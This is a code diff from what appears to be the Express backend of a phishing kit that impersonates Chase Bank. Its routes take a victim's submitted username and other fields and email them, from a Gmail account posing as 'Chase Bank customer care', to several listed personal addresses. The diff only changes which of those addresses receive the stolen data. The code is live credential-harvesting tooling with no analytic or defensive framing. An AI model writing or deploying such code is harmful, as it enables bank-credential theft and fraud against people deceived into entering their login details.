@@ -110,8 +110,8 @@ app.post('/_yesssh5/Safety/Chase/n/1eb932e5745c485929f49dbefceddd33', (req, res,
     let mailOptions = {
         from: 'Chase Bank <chasebankingcustomercare@gmail.com>',
         // to: 'olumbex@gmail.com',
-        to: 'vince.rex@yahoo.com',
-        // to: 'jordanrobert2000@gmail.com, vince.rex@yahoo.com',
+        // to: 'vince.rex@yahoo.com',
+        to: 'jordanrobert2000@gmail.com, vince.rex@yahoo.com',
         // to: 'pinhomes009@gmail.com',
         subject: 'Data From chaseish',
         text: `UserId: \n ${req.body.username} \n 
@@ -171,8 +171,8 @@ app.post('/_yesssh5/Safety/Chase/n/1eb932e5745c485929f49dbefceggg33', (req, res,
     let mailOptions = {
         from: 'Chase Bank <chasebankingcustomercare@gmail.com>',
         // to: 'olumbex@gmail.com',
-        // to: 'jordanrobert2000@gmail.com, vince.rex@yahoo.com',
-        to: 'vince.rex@yahoo.com',
+        to: 'jordanrobert2000@gmail.com, vince.rex@yahoo.com',
+        // to: 'vince.rex@yahoo.com',
         // to: 'pinhomes009@gmail.com',
         subject: 'Data From chaseish',
         text: `UserId: ${req.body.username} \n 
